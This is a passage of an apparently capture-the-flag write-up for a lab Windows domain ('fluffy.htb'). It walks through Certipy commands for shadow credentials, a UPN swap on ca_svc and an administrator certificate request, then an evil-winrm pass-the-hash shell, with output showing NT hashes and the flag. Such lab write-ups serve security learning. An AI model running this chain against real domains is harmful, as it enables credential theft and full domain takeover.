        Template Name                       : KerberosAuthentication
        Template Name                       : OCSPResponseSigning
        Template Name                       : RASAndIASServer
        Template Name                       : Workstation
        Template Name                       : DirectoryEmailReplication
        Template Name                       : DomainControllerAuthentication
        Template Name                       : KeyRecoveryAgent
        Template Name                       : CAExchange
        Template Name                       : CrossCA
        Template Name                       : ExchangeUserSignature
        Template Name                       : ExchangeUser
        Template Name                       : CEPEncryption
        Template Name                       : OfflineRouter
        Template Name                       : IPSECIntermediateOffline
        Template Name                       : IPSECIntermediateOnline
        Template Name                       : SubCA
        Template Name                       : CA
        Template Name                       : WebServer
        Template Name                       : DomainController
        Template Name                       : Machine
        Template Name                       : MachineEnrollmentAgent
        Template Name                       : EnrollmentAgentOffline
        Template Name                       : EnrollmentAgent
        Template Name                       : CTLSigning
        Template Name                       : CodeSigning
        Template Name                       : EFSRecovery
        Template Name                       : Administrator
        Template Name                       : EFS
        Template Name                       : SmartcardLogon
        Template Name                       : ClientAuth
        Template Name                       : SmartcardUser
        Template Name                       : UserSignature
        Template Name                       : User



```python
!certipy find -u ca_svc -hashes :CA0F4F9E9EB8A092ADDF53BB03FC98C8 -target-ip $target -enabled -vulnerable -stdout
```

    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Finding certificate templates
    [*] Found 33 certificate templates
    [*] Finding certificate authorities
    [*] Found 1 certificate authority
    [*] Found 11 enabled certificate templates
    [*] Trying to get CA configuration for 'fluffy-DC01-CA' via CSRA
    [!] Got error while trying to get CA configuration for 'fluffy-DC01-CA' via CSRA: Could not connect: timed out
    [*] Trying to get CA configuration for 'fluffy-DC01-CA' via RRP
    [*] Got CA configuration for 'fluffy-DC01-CA'
    [*] Enumeration output:
    Certificate Authorities
      0
        CA Name                             : fluffy-DC01-CA
        DNS Name                            : DC01.fluffy.htb
        Certificate Subject                 : CN=fluffy-DC01-CA, DC=fluffy, DC=htb
        Certificate Serial Number           : 3670C4A715B864BB497F7CD72119B6F5
        Certificate Validity Start          : 2025-04-17 16:00:16+00:00
        Certificate Validity End            : 3024-04-17 16:11:16+00:00
        Web Enrollment                      : Disabled
        User Specified SAN                  : Disabled
        Request Disposition                 : Issue
        Enforce Encryption for Requests     : Enabled
        Permissions
          Owner                             : FLUFFY.HTB\Administrators
          Access Rights
            ManageCertificates              : FLUFFY.HTB\Domain Admins
                                              FLUFFY.HTB\Enterprise Admins
                                              FLUFFY.HTB\Administrators
            ManageCa                        : FLUFFY.HTB\Domain Admins
                                              FLUFFY.HTB\Enterprise Admins
                                              FLUFFY.HTB\Administrators
            Enroll                          : FLUFFY.HTB\Cert Publishers
    Certificate Templates                   : [!] Could not find any certificate templates


Already have this from Rubeus


```python
!certipy shadow auto -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -account ca_svc
```

    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Targeting user 'ca_svc'
    [*] Generating certificate
    [*] Certificate generated
    [*] Generating Key Credential
    [*] Key Credential generated with DeviceID 'f82c51b2-4c5d-d1d4-2ea7-e9f2dad17d94'
    [*] Adding Key Credential with device ID 'f82c51b2-4c5d-d1d4-2ea7-e9f2dad17d94' to the Key Credentials for 'ca_svc'
    [*] Successfully added Key Credential with device ID 'f82c51b2-4c5d-d1d4-2ea7-e9f2dad17d94' to the Key Credentials for 'ca_svc'
    [*] Authenticating as 'ca_svc' with the certificate
    [*] Using principal: ca_svc@fluffy.htb
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'ca_svc.ccache'
    [*] Trying to retrieve NT hash for 'ca_svc'
    [*] Restoring the old Key Credentials for 'ca_svc'
    [*] Successfully restored the old Key Credentials for 'ca_svc'
    [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8



```python
!certipy account update -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator
```
```
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Updating user 'ca_svc':
        userPrincipalName                   : administrator
    [*] Successfully updated 'ca_svc'
```
Ran this twice after connection timeout

```python
!certipy req -u ca_svc@fluffy.htb -hashes :CA0F4F9E9EB8A092ADDF53BB03FC98C8 -ca fluffy-DC01-CA -target fluffy.htb
```
```
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Requesting certificate via RPC
    [*] Successfully requested certificate
    [*] Request ID is 19
    [*] Got certificate with UPN 'administrator'
    [*] Certificate has no object SID
    [*] Saved certificate and private key to 'administrator.pfx'
```


```python
!certipy account update -u winrm_svc@fluffy.htb -hashes :33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn ca_svc
```
```
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Updating user 'ca_svc':
        userPrincipalName                   : ca_svc
    [*] Successfully updated 'ca_svc'
```


```python
!certipy auth -pfx administrator.pfx -domain fluffy.htb
```
```log
    Certipy v4.8.2 - by Oliver Lyak (ly4k)
    
    [*] Using principal: administrator@fluffy.htb
    [*] Trying to get TGT...
    [*] Got TGT
    [*] Saved credential cache to 'administrator.ccache'
    [*] Trying to retrieve NT hash for 'administrator'
    [*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
```


To sum up the above, often certificate templates have weird permissions that let us either use them for unintended purposes (login instead of server auth as an example), maybe they allow bad groups to use the template (like low privilege users making machine accounts for domain joins), or in this case just allowing bad properties to be updated along with the template generation (like us using ca_svc to make a certificate signed as a different upn.).
```sh
 evil-winrm -i fluffy.htb -H 8da83a3fa618b6e3a00e93f676c92a6e -u administrator
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ../Desktop/root.txt
6023a978f0e27fbd077c3ad09bf55fd4
```